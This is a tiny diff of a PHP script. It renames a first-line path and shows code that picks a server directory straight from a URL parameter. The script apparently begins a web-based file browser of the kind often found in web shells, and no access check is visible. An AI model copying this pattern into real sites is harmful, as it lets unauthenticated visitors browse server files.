@@ -1,4 +1,4 @@
-/abssss/
+/abkos/
 <?php
 $current = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
 if (!$current || !is_dir($current)) $current = getcwd();
